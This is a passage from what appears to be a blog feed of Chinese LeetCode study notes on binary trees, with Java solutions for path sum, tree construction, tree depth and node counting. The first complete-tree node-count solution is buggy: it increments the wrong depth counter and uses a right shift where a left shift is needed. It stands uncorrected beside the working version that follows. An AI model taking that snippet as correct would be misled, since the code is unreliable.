力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>类似数组遍历求和（滑动窗口）找目标总和值只不过换成二叉树.<br>首先还是想到按照前序遍历的方式，递归遍历.由于根节点是一定要选中的，(null另算)那我们遍历子节点做差判断最后是否等于0即可.<br>或者可以从下向上按照层，借助队列实现二叉树版滑动窗口.🤔</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPathSum</span><span class="params">(TreeNode root, <span class="type">int</span> targetSum)</span> &#123;</span><br><span class="line">        <span class="comment">//特殊情况优先</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        targetSum -= root.val;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> hasPathSum(root.left,targetSum);</span><br><span class="line">            <span class="comment">//剪枝判断</span></span><br><span class="line">            <span class="keyword">if</span>(left) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> hasPathSum(root.right,targetSum);</span><br><span class="line">            <span class="keyword">if</span>(right) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从中序和后序遍历构造二叉树"><a href="#从中序和后序遍历构造二叉树" class="headerlink" title="从中序和后序遍历构造二叉树"></a>从中序和后序遍历构造二叉树</h4><p>link：<a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/description/">106. 从中序与后序遍历序列构造二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实和我们数据结构考试中的内容一致，画图推推规律.<br><img src="/../imgs/2024-10/image-20241112100932554.png" alt="image-20241112100932554"></p><p><img src="/../imgs/2024-10/image-20241112101050227.png" alt="image-20241112101050227"></p><p>根据画图规律可得 后续遍历中root位置出现在最后一个位置，再结合中序遍历可以得出9为左子树，15、20、7为右子树.<br>我使用Map进行解决,key存储值，value存储下标.<br>中序遍历中root的index + 1.<br>根据之前分析的规律，我们利用后序遍历确定root.value，然后对应在中序遍历中定位到root位置（利用index）然后回溯到中序遍历切割出左子树那么在后序遍历中剩余的部分就是右子树.</p><h6 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer,Integer&gt; map;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;inorder.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> FindOrder(inorder,<span class="number">0</span>,inorder.length,postorder,<span class="number">0</span>,postorder.length);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">FindOrder</span><span class="params">(<span class="type">int</span>[] inOrder,<span class="type">int</span> inBegin,<span class="type">int</span> inEnd,<span class="type">int</span>[] postOrder,<span class="type">int</span> postBegin,<span class="type">int</span> postEnd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//结束条件,左闭右开</span></span><br><span class="line">        <span class="keyword">if</span>(inBegin&gt;=inEnd || postBegin&gt;=postEnd)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到后序在中序的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> map.get(postOrder[postEnd - <span class="number">1</span>]);</span><br><span class="line">        <span class="comment">//构造节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(inOrder[index]);</span><br><span class="line">        <span class="comment">//保存中序左子树的个数,用来确定后序的区间</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lenOfLeft</span> <span class="operator">=</span> index - inBegin;</span><br><span class="line">        root.left = FindOrder(inOrder,inBegin,index,postOrder,postBegin,postBegin+lenOfLeft);</span><br><span class="line">        root.right = FindOrder(inOrder,index+<span class="number">1</span>,inEnd,postOrder,postBegin+lenOfLeft,postEnd-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> postIndex;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] inorder, <span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line"></span><br><span class="line">        postIndex = postorder.length-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buildTreeChild(postorder,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">buildTreeChild</span><span class="params">(<span class="type">int</span>[] postorder,<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 没有左树 或者 没有右树了</span></span><br><span class="line">        <span class="keyword">if</span>(inbegin &gt; inend) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.创建根节点</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(postorder[postIndex]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.从中序遍历当中 找到根节点所在的下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rootIndex</span> <span class="operator">=</span> findIndex(inorder,inbegin,inend,postorder[postIndex]);</span><br><span class="line">        <span class="keyword">if</span>(rootIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        postIndex--;</span><br><span class="line">        <span class="comment">//4. 创建左子树 和  右子树</span></span><br><span class="line"></span><br><span class="line">        root.right = buildTreeChild(postorder,inorder,rootIndex+<span class="number">1</span>,inend);</span><br><span class="line"></span><br><span class="line">        root.left = buildTreeChild(postorder,inorder,inbegin,rootIndex-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">findIndex</span><span class="params">(<span class="type">int</span>[] inorder,<span class="type">int</span> inbegin,<span class="type">int</span> inend,<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> inbegin;i &lt;= inend;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[i] == key) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><h3 id="理解构建过程的示例"><a href="#理解构建过程的示例" class="headerlink" title="理解构建过程的示例"></a>理解构建过程的示例</h3><p>以中序遍历 <code>inorder = [9, 3, 15, 20, 7]</code> 和后序遍历 <code>postorder = [9, 15, 7, 20, 3]</code> 为例：</p><ol><li><strong>第一次调用</strong>：<ul><li><code>postIndex</code> 指向 <code>3</code>，创建根节点 <code>3</code>.</li><li>在中序数组中找到 <code>3</code> 的索引为 <code>1</code>.</li><li>右子树范围 <code>[15, 20, 7]</code>，左子树范围 <code>[9]</code>.</li></ul></li><li><strong>构建右子树</strong>：<ul><li>递归调用构建右子树，<code>postIndex</code> 现在指向 <code>20</code>，创建节点 <code>20</code>.</li><li>在中序数组中找到 <code>20</code> 的索引为 <code>3</code>.</li></ul></li><li><strong>构建左子树（对于 <code>20</code>）</strong>：<ul><li>继续递归构建右子树（此时后序的下一节点是 <code>7</code>）.</li><li>处理完 <code>20</code> 的右子树后，回溯到 <code>20</code>，然后处理 <code>20</code> 的左子树（为 <code>15</code>）.</li></ul></li><li><strong>构建左子树（对于 <code>3</code>）</strong>：<ul><li>现在回到根节点 <code>3</code>，处理左子树（此时后序的下一节点是 <code>9</code>）.</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;找树左下角的值&quot;&gt;&lt;a href=&quot;#找树左下角的值&quot; class=&quot;headerlink&quot; title=&quot;找树左下角的值&quot;&gt;&lt;/a&gt;找树左下角的值&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/find-bo</summary>
      
    
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x11</title>
    <link href="https://yubut.github.io/2024/11/09/yub%E3%81%AEAlgorithm.0x11/"/>
    <id>https://yubut.github.io/2024/11/09/yub%E3%81%AEAlgorithm.0x11/</id>
    <published>2024-11-09T12:23:53.000Z</published>
    <updated>2024-11-12T14:15:44.166Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二叉树的最大深度"><a href="#二叉树的最大深度" class="headerlink" title="二叉树的最大深度"></a>二叉树的最大深度</h4><p>link：<a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/description/">104. 二叉树的最大深度 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>高度：后序遍历<br>深度：前序遍历<br>但是其实这里我们可以选择后序遍历，根节点的高度就是树的深度.</p><p><img src="/../imgs/2024-10/image-20241109214025557.png" alt="image-20241109214025557"></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> leftHeight &gt; rightHeight ? leftHeight + <span class="number">1</span> : rightHeight + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉树的最小深度"><a href="#二叉树的最小深度" class="headerlink" title="二叉树的最小深度"></a>二叉树的最小深度</h4><p>link:<a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/description/">111. 二叉树的最小深度 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>和上题的思路基本一致，但是注意不是把最大值改成最小值.<br>自己画图分析一下有哪些情况，还是之前讲的特殊情况优先考虑.<br>按照我们上一题的思路，针对左子树只有一个节点，但右子树有至少一层分支的基础上，最小深度就不会是1了.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> getHeight(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(node.right);</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> rightHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> leftHeight + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> leftHeight&gt;rightHeight?rightHeight+<span class="number">1</span>:leftHeight+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完全二叉树节点个数"><a href="#完全二叉树节点个数" class="headerlink" title="完全二叉树节点个数"></a>完全二叉树节点个数</h4><p>link：<a href="https://leetcode.cn/problems/count-complete-tree-nodes/submissions/">222. 完全二叉树的节点个数 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先想到的是在之前深度的基础上，遍历计数节点，利用完全二叉树的性质，左子树的高度一定是大于等于右子树的高度，所以我们遍历只需要判断左子树就行.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNum(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> node.left;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> node.right;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">            right = right.right;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">            left = left.left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &gt;&gt; leftDepth) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftnum</span> <span class="operator">=</span> getNum(node.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightnum</span> <span class="operator">=</span> getNum(node.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> leftnum + rightnum + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优化版</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNumber(root);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算左子树的深度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> getDepth(node.left);</span><br><span class="line">        <span class="comment">// 计算右子树的深度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> getDepth(node.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果左子树和右子树的深度相等，说明是完全二叉树</span></span><br><span class="line">        <span class="keyword">if</span> (leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; leftDepth) + getNumber(node.right); <span class="comment">// 2^leftDepth + 右子树的节点数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; rightDepth) + getNumber(node.left); <span class="comment">// 2^rightDepth + 左子树的节点数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算树的深度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDepth</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            node = node.left; <span class="comment">// 只计算左子树的深度</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
